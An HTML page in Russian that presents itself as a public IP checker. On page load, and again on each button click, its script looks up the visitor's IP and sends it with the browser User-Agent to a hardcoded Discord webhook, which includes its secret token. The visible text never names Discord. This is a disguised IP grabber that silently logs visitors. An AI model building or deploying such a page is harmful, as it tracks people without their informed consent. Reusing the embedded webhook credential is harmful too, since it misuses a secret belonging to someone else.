<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Проверка публичного IP</title>
  <style>
    body { font: 16px system-ui, sans-serif; max-width: 620px; margin: 10vh auto; padding: 24px; color: #eee; background: #151515; }
    main { background: #222; border: 1px solid #444; border-radius: 14px; padding: 24px; }
    button { padding: 11px 16px; border: 0; border-radius: 8px; cursor: pointer; font-weight: 600; }
    #check { background: #8b5cf6; color: white; }
    #copy { background: #444; color: white; margin-left: 8px; }
    #result { margin-top: 18px; overflow-wrap: anywhere; font-size: 1.2rem; }
    small { color: #bbb; line-height: 1.5; display: block; margin-top: 14px; }
  </style>
</head>
<body>
  <main>
    <h1>Проверка публичного IP</h1>
    <p>Ваш публичный IP-адрес загружается и отправляется на сервер...</p>
    <button id="check">Показать мой IP</button>
    <button id="copy" hidden>Копировать</button>
    <div id="result" role="status" aria-live="polite"></div>
    <small>Для получения IP браузер обращается к внешнему сервису ipify. Адрес может отличаться от локального IP устройства.</small>
  </main>
  <script>
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1566044694520139776/nWULDF8SyR4Uy1c8hfTeJy1Vd-8iYRdkarDKUijPBH6gEhg1fgjkRY2U5mz6f3_6prMp';

    const check = document.getElementById('check');
    const result = document.getElementById('result');
    const copy = document.getElementById('copy');

    async function sendToWebhook(ip) {
      try {
        await fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `🌐 Новый посетитель!\n**IP:** \`${ip}\`\n**User-Agent:** ${navigator.userAgent}`
          })
        });
      } catch (e) {
        console.error('Ошибка отправки в Discord вебхук:', e);
      }
    }

    async function getAndSendIP() {
      check.disabled = true;
      result.textContent = 'Получаем IP…';
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) throw new Error('Request failed');
        const data = await response.json();
        
        result.textContent = 'Ваш публичный IP: ' + data.ip;
        copy.hidden = false;
        copy.onclick = async () => {
          await navigator.clipboard.writeText(data.ip);
          copy.textContent = 'Скопировано';
        };

        // Отправка в Discord вебхук
        await sendToWebhook(data.ip);
      } catch {
        result.textContent = 'Не удалось получить IP. Проверьте подключение и попробуйте снова.';
      } finally {
        check.disabled = false;
      }
    }

    // Автоматический запуск при открытии страницы
    window.addEventListener('DOMContentLoaded', getAndSendIP);

    // Ручной запуск при клике на кнопку
    check.addEventListener('click', getAndSendIP);
  </script>
</body>
</html>
